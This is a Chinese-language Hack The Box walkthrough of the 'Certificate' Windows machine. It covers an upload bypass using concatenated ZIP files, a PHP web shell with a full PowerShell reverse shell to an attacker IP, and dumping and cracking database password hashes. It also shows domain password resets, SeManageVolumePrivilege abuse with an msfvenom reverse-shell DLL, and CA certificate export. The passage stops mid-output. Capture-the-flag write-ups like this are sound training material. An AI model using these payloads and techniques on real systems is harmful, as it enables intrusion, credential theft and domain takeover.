{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Certificate","contentHtml":"<h1>Season8 - Certificate</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Certificate\">https://app.hackthebox.com/machines/Certificate</a> | <code>Windows</code> | <code>Hard</code></p>\n</blockquote>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Certificate nmap -sT -min-rate 5000 10.10.11.71             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:18 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.71\nHost is up (0.050s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Certificate nmap -sT -A -p 80,135,139,445,636,389 10.10.11.71\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:19 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.71\nHost is up (0.076s latency).\n\nPORT    STATE SERVICE       VERSION\n80/tcp  open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)\n|_http-title: Did not follow redirect to http://certificate.htb/\n|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-06-01T20:59:35+00:00; +7h38m38s from scanner <span class=\"hljs-keyword\">time</span>.\n| ssl-cert: Subject: commonName=DC01.certificate.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:DC01.certificate.htb\n| Not valid before: 2024-11-04T03:14:54\n|_Not valid after:  2025-11-04T03:14:54\n445/tcp open  microsoft-ds?\n636/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-06-01T20:59:36+00:00; +7h38m37s from scanner <span class=\"hljs-keyword\">time</span>.\n| ssl-cert: Subject: commonName=DC01.certificate.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:DC01.certificate.htb\n| Not valid before: 2024-11-04T03:14:54\n|_Not valid after:  2025-11-04T03:14:54\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-06-01T20:58:58\n|_  start_date: N/A\n|_clock-skew: mean: 7h38m37s, deviation: 0s, median: 7h38m37s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   85.58 ms 10.10.16.1\n2   87.46 ms 10.10.11.71\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 60.74 seconds\n</code></pre>\n<p>刚刚尝试了<code>SMB</code>无法使用匿名账户进行访问，因为还扫描到了<code>80</code>端口，所以从<code>Web</code>下手</p>\n<h2>Web</h2>\n<p>访问 <code>HTTP</code> 并采集指纹</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image.png\" alt=\"image.png\"></p>\n<p>其中还有登录页和注册页</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image1.png\" alt=\"image.png\"></p>\n<p>创建了一个账户 <code>sunset</code> 并使用账户进行登录，并且用户类型有<code>student</code>和<code>teacher</code>，没有发现什么登陆之后才有的功能，教师用户登录不进去</p>\n<p>扫描一下网站目录</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate dirsearch -u http://certificate.htb/ -e php,txt,zip -x 403,404,503\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/HackTheBox/Certificate/reports/http_certificate.htb/__25-06-01_21-34-42.txt\n\nTarget: http://certificate.htb/\n\n[21:34:42] Starting: \n[21:34:50] 200 -   14KB - /about.php\n[21:35:01] 500 -  638B  - /cgi-bin/printenv.pl\n[21:35:05] 200 -    0B  - /db.php\n[21:35:09] 200 -    3KB - /footer.php\n[21:35:10] 200 -    2KB - /header.php\n[21:35:15] 200 -    9KB - /login.php\n[21:35:15] 302 -    0B  - /logout.php  ->  login.php\n[21:35:25] 200 -   11KB - /register.php\n[21:35:30] 301 -  343B  - /static  ->  http://certificate.htb/static/\n[21:35:30] 301 -  345B  - /static..  ->  http://certificate.htb/static../\n[21:35:34] 302 -    0B  - /upload.php  ->  login.php\n\nTask Completed\n</code></pre>\n<p>扫描出来 <code>upload.php</code> 访问一下，貌似缺少参数</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image2.png\" alt=\"image.png\"></p>\n<p>最后在 <code>course</code> 中可以找到上传页面</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image3.png\" alt=\"image.png\"></p>\n<p>该处可能存在文件上传漏洞</p>\n<h3>文件上传利用 &#x26; ZipSlip? &#x26; <strong>ZIP Concatenation?</strong></h3>\n<p>上传页面中提示：</p>\n<ul>\n<li>\n<p>Please select the assignment file you want to upload (the file will be reviewed by the course instructor)</p>\n<p>请选择您要上传的作业文件（该文件将由课程讲师审核）</p>\n</li>\n<li>\n<p>We accept only the following file types: <code>.pdf</code> <code>.docx</code> <code>.pptx</code> <code>.xlsx</code></p>\n<p>我们只接受以下文件类型：<code>.pdf</code> <code>.docx</code> <code>.pptx</code> <code>.xlsx</code></p>\n</li>\n<li>\n<p>You include the assignment file in .zip archive file to reduce it's size</p>\n<p>将任务文件包含在存档文件中<code>.zip</code>以减小其大小</p>\n</li>\n</ul>\n<p>经过测试，可以直接上传<code>PDF</code>文件，并且会检查文件头。也可以将<code>pdf</code>以<code>zip</code>格式压缩，然后上传（这里不能使用<code>bindzip</code>），上传<code>zip</code>文件之后会自动进行解压。</p>\n<p>这里对上传功能点进行了常规的测试，例如修改文件后缀名等等，但是无法成功。</p>\n<p>通过网络搜索，发现还可能存在 <code>ZipSlip</code> 漏洞</p>\n<blockquote>\n<p><a href=\"https://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f\">https://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f</a></p>\n</blockquote>\n<p>能达到<code>RCE</code>的效果，可以覆盖 <code>/etc/passwd</code> 文件或者公钥文件或者其他文件</p>\n<blockquote>\n<p>一些利用了<code>ZipSlip</code>的CTF：<a href=\"https://starlox.medium.com/cyberspace2024-zipzone-ctf-zipslip-vulnerability-00489669feec\">https://starlox.medium.com/cyberspace2024-zipzone-ctf-zipslip-vulnerability-00489669feec</a></p>\n</blockquote>\n<p>我这里尝试了</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate tree zip \nzip\n├── 1.pdf\n└── evil\n    └── test.php\n\n➜  Certificate zip 2.zip zip/*\n  adding: zip/1.pdf (deflated 7%)\n  adding: zip/evil/ (stored 0%)\n</code></pre>\n<p>然后上传<code>2.zip</code> ，但是页面不回显，无法得到上传后的文件夹路径</p>\n<blockquote>\n<p>别人分享的一个链接：<a href=\"https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%9A%84\">https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/，其中的</a> <strong>Chained Archives Explained: Concatenated ZIPs</strong> 可能对我们有效</p>\n</blockquote>\n<pre><code class=\"hljs language-bash\">➜  Certificate <span class=\"hljs-built_in\">ls</span>               \n1.pdf  evil\n\n➜  Certificate <span class=\"hljs-built_in\">ls</span> evil   \ntest.php\n\n➜  Certificate zip -r 1.zip evil\n  adding: evil/ (stored 0%)\n  adding: evil/test.php (stored 0%)\n  \n➜  Certificate zip 2.zip 1.pdf  \n  adding: 1.pdf (deflated 7%)\n  \n➜  Certificate <span class=\"hljs-built_in\">cat</span> 1.zip 2.zip > 3.zip  （无法上传）\n\n➜  Certificate <span class=\"hljs-built_in\">cat</span> 2.zip 1.zip > 3.zip  （成功上传）\n</code></pre>\n<p>点击访问，并输入 <code>evil/test.php</code> 成功执行！！</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image4.png\" alt=\"image.png\"></p>\n<p>上传一句话木马</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php shell_exec(<span class=\"hljs-string\">\"powershell -nop -w hidden -c \\\"\\$client = New-Object System.Net.Sockets.TCPClient('10.10.16.43',4444); \\$stream = \\$client.GetStream(); [byte[]]\\$bytes = 0..65535|%{0}; while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){; \\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0,\\$i); \\$sendback = (iex \\$data 2>&#x26;1 | Out-String ); \\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> '; \\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2); \\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length); \\$stream.Flush()}; \\$client.Close()\\\"\"</span>);?>\n</code></pre>\n<p>PS：这里假如断开了，下次再连接是使用新的端口接收 shell</p>\n<pre><code class=\"hljs language-bash\">malicious_files/shell.php\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image5.png\" alt=\"image.png\"></p>\n<h2>Mysql Dump</h2>\n<p>我们扫描目录的时候能看到存在<code>db.php</code> ,我们将其读取</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php\n// Database connection using PDO\ntry {\n    <span class=\"hljs-variable\">$dsn</span> = <span class=\"hljs-string\">'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4'</span>;\n    <span class=\"hljs-variable\">$db_user</span> = <span class=\"hljs-string\">'certificate_webapp_user'</span>; // Change to your DB username\n    <span class=\"hljs-variable\">$db_passwd</span> = <span class=\"hljs-string\">'cert!f!c@teDBPWD'</span>; // Change to your DB password\n    <span class=\"hljs-variable\">$options</span> = [\n        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,\n        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n    ];\n    <span class=\"hljs-variable\">$pdo</span> = new PDO(<span class=\"hljs-variable\">$dsn</span>, <span class=\"hljs-variable\">$db_user</span>, <span class=\"hljs-variable\">$db_passwd</span>, <span class=\"hljs-variable\">$options</span>);\n} catch (PDOException <span class=\"hljs-variable\">$e</span>) {\n    die(<span class=\"hljs-string\">'Database connection failed: '</span> . <span class=\"hljs-variable\">$e</span>->getMessage());\n}\n?>\n</code></pre>\n<p>读取数据库的数据</p>\n<pre><code class=\"hljs language-bash\">PS C:\\xampp\\mysql\\bin> &#x26; <span class=\"hljs-string\">\"C:\\xampp\\mysql\\bin\\mysql.exe\"</span> -u certificate_webapp_user -p<span class=\"hljs-string\">\"cert!f!c@teDBPWD\"</span> -D Certificate_WEBAPP_DB -e <span class=\"hljs-string\">\"show tables;\"</span>\nTables_in_certificate_webapp_db\ncourse_sessions\ncourses\n<span class=\"hljs-built_in\">users</span>\nusers_courses\n</code></pre>\n<pre><code class=\"hljs language-bash\">PS C:\\xampp\\mysql\\bin> &#x26; <span class=\"hljs-string\">\"C:\\xampp\\mysql\\bin\\mysql.exe\"</span> -u certificate_webapp_user -p<span class=\"hljs-string\">\"cert!f!c@teDBPWD\"</span> -D Certificate_WEBAPP_DB -e <span class=\"hljs-string\">\"select * from users;\"</span>\n<span class=\"hljs-built_in\">id</span>      first_name      last_name       username        email   password        created_at      role    is_active\n1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04<span class=\"hljs-variable\">$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG</span>    2024-12-23 12:43:10     teacher 1\n6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04<span class=\"hljs-variable\">$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj</span>.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1\n7       John    Wood    Johney  johny009@mail.com       $2y$04<span class=\"hljs-variable\">$VaUEcSd6p5NnpgwnHyh8zey13zo</span>/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1\n8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04<span class=\"hljs-variable\">$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti</span>    2024-12-24 09:08:04     teacher 1\n9       Steven  Roman   stev    steven@yahoo.com        $2y$04<span class=\"hljs-variable\">$6FHP</span>.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1\n10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04<span class=\"hljs-variable\">$CgDe</span>/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1\n12      sunset  sunset  sunset  1@q.xom $2y$04<span class=\"hljs-variable\">$46hjL</span>/TUPqsT3KI7R/6tje1JOSy5.riL8ABfus1G8WZujELAgnQvy    2025-06-01 16:49:22     student 1\n13      r       r       admin   t@t.com $2y$04<span class=\"hljs-variable\">$ui6Qc</span>/eaGGRKK2ovA4iJne7qbd1uSkm5lVbEHnPWWKYYwzb2s0hY2    2025-06-01 16:49:28     student 1\n14      sunset2 sunset2 sunset2 1@qq.com        $2y$04<span class=\"hljs-variable\">$F5Rr9QzbhhaEh7QhJKKwz</span>.ClZdVaA9QPI9RBdy8v.G/Pc7TDAO196    2025-06-01 16:57:14     student 1\n16      admin123        admin123        admin123        admin123@gmail.com      $2y$04<span class=\"hljs-variable\">$ViY8NzbVBvUlwppQcDrld</span>.mh.1XcGQkc4lt6j5Uhj7IPyGq4Z0hQu    2025-06-01 16:59:02     student 1\n17      Admin   Admin   adminsucks      admin@gmail.com $2y$04<span class=\"hljs-variable\">$FMa5TpAFpTDu5EwgVzybnuAJFryR18dzfSqZGLQFzHhqj</span>/BwksTdy    2025-06-01 17:12:43     student 1\n18      admin   adnim   adminadnim      admin@adnim.com $2y$04<span class=\"hljs-variable\">$x</span>.Ak4KXkM.MLNA0JgCEPxevbFuBioVs5NONlqrw.eO2js1/5AQh8i    2025-06-01 17:14:15     teacher 0\n19      1       2       3       <span class=\"hljs-built_in\">test</span>@test.com   $2y$04<span class=\"hljs-variable\">$dFR</span>.yVKC/u9UwlPsyxa5fO11vPvZnFUhRxi2Uf25SoGQRaTE6SmBW    2025-06-01 17:16:12     teacher 0\n20      test2   test2   test2   test2@test.com  $2y$04<span class=\"hljs-variable\">$Ci4wfETizE9WCrUgpC4tyuI7s4oLIpK</span>/DWb/uhjO2IKTRIfD9JUGy    2025-06-01 17:17:40     teacher 0\n22      test3   test3   test3   test3@test.com  $2y$04<span class=\"hljs-variable\">$m51Lz73GtqPoAzovxJeCM</span>.B8/SAkDERIl7OBZfxAAQahNpiVFPsKe    2025-06-01 17:34:30     student 1\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image6.png\" alt=\"image.png\"></p>\n<p>其中我们感兴趣的用户有两条</p>\n<pre><code class=\"hljs language-bash\">10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04<span class=\"hljs-variable\">$CgDe</span>/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1\n1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04<span class=\"hljs-variable\">$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG</span>    2024-12-23 12:43:10     teacher 1\n</code></pre>\n<p>对密码进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>  \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 16 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nBlink182         (?)   \n</code></pre>\n<p>爆破了好一会将<code>sara.b</code> 的密码爆破出来了</p>\n<p>测试用户有效性</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate nxc smb 10.10.11.71 -u sara.b -p Blink182 -d certificate.htb\nSMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.71     445    DC01             [+] certificate.htb\\sara.b:Blink182\n</code></pre>\n<h2>域分析</h2>\n<p><code>bloodhound-python</code> 搜集信息</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate bloodhound-python -u <span class=\"hljs-string\">'sara.b'</span> -p <span class=\"hljs-string\">'Blink182'</span> -d <span class=\"hljs-string\">'certificate.htb'</span> -ns 10.10.11.71 --zip -c All -dc <span class=\"hljs-string\">'DC01.certificate.HTB'</span>\nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: certificate.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: DC01.certificate.HTB\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: DC01.certificate.HTB\nINFO: Found 19 <span class=\"hljs-built_in\">users</span>\nINFO: Found 58 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WS-05.certificate.htb\nINFO: Querying computer: WS-01.certificate.htb\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 20S\nINFO: Compressing output into 20250602223438_bloodhound.zip\n</code></pre>\n<p>发现用户 <code>sara.b</code> 是属于 <code>REMOTE MANAGEMENT USERS</code>组的</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image7.png\" alt=\"image.png\"></p>\n<p>并且是 <code>Account Operators</code>组的用户</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image8.png\" alt=\"image.png\"></p>\n<p>那就是可以更改用户的密码、创建用户组等，但是不能直接修改 <code>admins</code> 组用户的密码</p>\n<p>查看一下 <code>Domain Admins</code> 组，只有 <code>administrator</code> 用户一个，故无法直接获得域权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image9.png\" alt=\"image.png\"></p>\n<p>先使用 <code>sara.b</code> 登录到 <code>DC</code> 进行信息收集</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate evil-winrm -i 10.10.11.71 -u <span class=\"hljs-string\">'sara.b'</span> -p <span class=\"hljs-string\">'Blink182'</span> \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class=\"hljs-string\">' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Sara.B\\Documents> \n</span></code></pre>\n<p>查看<code>users</code> 文件夹，有好几个用户，先做好打算横向到哪一个用户</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users> <span class=\"hljs-built_in\">ls</span>\n\n    Directory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       12/30/2024   8:33 PM                Administrator\nd-----       11/23/2024   6:59 PM                akeder.kh\nd-----        11/4/2024  12:55 AM                Lion.SK\nd-r---        11/3/2024   1:05 AM                Public\nd-----        11/3/2024   7:26 PM                Ryan.K\nd-----         6/2/2025   8:17 AM                saad.m\nd-----       11/26/2024   4:12 PM                Sara.B\nd-----       12/29/2024   5:30 PM                xamppuser\n</code></pre>\n<p>其中最令人感兴趣的是 <code>LION.SK</code> 和 <code>RYAN.K</code></p>\n<p><code>LION.SK</code> 属于<code>DOMAIN CRA MANAGERS</code> 该组解释是：该安全组的成员负责为域用户发行和撤销多个证书</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image10.png\" alt=\"image.png\"></p>\n<p><code>RYAN.K</code> 属于 <code>DOMAIN STORAGE MANAGERS</code> 改组解释是：该安全组的成员负责量级任务，例如维护，碎片部和管理分区和磁盘</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image11.png\" alt=\"image.png\"></p>\n<p>查看一下俩用户权限</p>\n<p>更改用户<code>LION.SK</code> 的密码</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate bloodyAD -d certificate.htb -u <span class=\"hljs-string\">'sara.b'</span> -p <span class=\"hljs-string\">'Blink182'</span> --dc-ip 10.10.11.71 <span class=\"hljs-built_in\">set</span> password LION.SK <span class=\"hljs-string\">'Password123!!!'</span>\n[+] Password changed successfully!\n</code></pre>\n<p>在 <code>LION.SK</code> 用户家目录中能得到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Lion.SK\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\n4c634600c2be9138b12e74ac6f288176\n</code></pre>\n<p>枚举用户权限</p>\n<pre><code class=\"hljs language-bash\">PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working <span class=\"hljs-built_in\">set</span> Enabled\n</code></pre>\n<p>更改用户<code>RYAN.K</code> 的密码</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate bloodyAD -d certificate.htb -u <span class=\"hljs-string\">'sara.b'</span> -p <span class=\"hljs-string\">'Blink182'</span> --dc-ip 10.10.11.71 <span class=\"hljs-built_in\">set</span> password RYAN.K <span class=\"hljs-string\">'Password123!!!'</span>\n[+] Password changed successfully!\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Certificate evil-winrm -i 10.10.11.71 -u <span class=\"hljs-string\">'RYAN.K'</span> -p <span class=\"hljs-string\">'Password123!!!'</span>\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class=\"hljs-string\">' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> \n</span></code></pre>\n<p>发现 <code>RYAN.K</code> 用户有 <code>SeManageVolumePrivilege</code> 权限</p>\n<pre><code class=\"hljs language-bash\">PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                      State\n============================= ================================ =======\nSeMachineAccountPrivilege     Add workstations to domain       Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking         Enabled\nSeManageVolumePrivilege       Perform volume maintenance tasks Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working <span class=\"hljs-built_in\">set</span>   Enabled\n</code></pre>\n<h2>SeManageVolumePrivilege 滥用</h2>\n<blockquote>\n<p>找到一些利用文档和POC：<a href=\"https://github.com/CsEnox/SeManageVolumeExploit\">https://github.com/CsEnox/SeManageVolumeExploit</a> | <a href=\"https://cn-sec.com/archives/3100947.html\">https://cn-sec.com/archives/3100947.html</a></p>\n</blockquote>\n<p>改权限大致是让我们能拥有写入 <code>C</code> 盘的权限</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'1'</span> > ../../../1.txt\nAccess to the path <span class=\"hljs-string\">'C:\\1.txt'</span> is denied.\nAt line:1 char:1\n+ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'1'</span> > ../../../1.txt\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException\n    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand\n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> upload SeManageVolumeExploit.exe\n                                        \nInfo: Uploading /root/Desktop/HackTheBox/Certificate/SeManageVolumeExploit.exe to C:\\Users\\Ryan.K\\Documents\\SeManageVolumeExploit.exe\n                                        \nData: 16384 bytes of 16384 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> ./SeManageVolumeExploit.exe\nEntries changed: 859\n\nDONE\n</code></pre>\n<p>成功写入 <code>C</code> 盘</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'1'</span> > ../../../1.txt\n</code></pre>\n<h3>DLL hijack？</h3>\n<p><code>POC</code>链接中的<code>DLL</code>劫持无法使用，因为没有存在 <code>spool</code> 文件夹</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\windows\\system32> cmd /c <span class=\"hljs-built_in\">dir</span> | findstr spoo\n11/26/2024  07:02 PM            93,184 spoolss.dll\n11/26/2024  07:03 PM           564,224 winspool.drv\n</code></pre>\n<p>但是可以劫持别的<code>DLL</code></p>\n<blockquote>\n<p><a href=\"https://github.com/xct/SeManageVolumeAbuse\">https://github.com/xct/SeManageVolumeAbuse</a></p>\n</blockquote>\n<p>这里有别的<code>DLL</code>劫持方法，同时系统也存在该<code>DLL</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\windows\\system32\\wbem> cmd /c <span class=\"hljs-built_in\">dir</span> | findstr tzres\n06/02/2025  09:33 AM             9,216 tzres.dll\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Certificate msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.45 LPORT=1234 -f dll -o tzres.dll \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No <span class=\"hljs-built_in\">arch</span> selected, selecting <span class=\"hljs-built_in\">arch</span>: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of dll file: 9216 bytes\nSaved as: tzres.dll\n</code></pre>\n<p>但是最后 <code>systeminfo</code> <code>Access is denied</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\windows\\system32\\wbem> systeminfo\nProgram <span class=\"hljs-string\">'systeminfo.exe'</span> failed to run: Access is deniedAt line:1 char:1\n+ systeminfo\n+ ~~~~~~~~~~.\nAt line:1 char:1\n+ systeminfo\n+ ~~~~~~~~~~\n    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException\n    + FullyQualifiedErrorId : NativeCommandFailed\n</code></pre>\n<h3>CA.pfx</h3>\n<p>佬们给出了另外一个方案，拥有<code>SeManageVolumePrivilege</code> 权限后可以通过<code>certuil</code> 来导出证书</p>\n<p>枚举<code>CA</code></p>\n<pre><code class=\"hljs language-bash\">➜  Certificate certipy-ad find -u sara.b -p <span class=\"hljs-string\">'Blink182'</span> -dc-ip 10.10.11.71 -text\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image12.png\" alt=\"image.png\"></p>\n<p>导出<code>CA</code>的证书</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> certutil -exportPFX my <span class=\"hljs-string\">\"Certificate-LTD-CA\"</span> C:\\Users\\Public\\ca.pfx\nmy <span class=\"hljs-string\">\"Personal\"</span>\n================ Certificate 2 ================\nSerial Number: 